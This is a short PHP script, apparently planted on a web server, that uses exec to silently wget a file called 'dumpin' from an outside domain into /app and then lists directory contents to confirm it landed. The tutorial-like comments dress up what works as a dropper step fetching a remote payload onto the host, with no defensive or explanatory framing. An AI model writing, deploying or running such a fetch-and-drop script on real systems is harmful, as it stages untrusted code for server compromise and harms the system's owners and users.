<?php

//Store the output of the executed command

$output1 =  exec('wget -q -O /app/dumpin http://mypaneldata.my.id/dumpin');

//Print the return value

echo $output1;

echo "<br/>";

//Store the last line of the executed command

$output2 = exec('ls -la');

//Print the return value

echo $output2;

echo "<br/>";

//Store the last line of the executed command

$output3 = exec('cd /app; ls -a');

//Print the return value

echo $output3;

?>
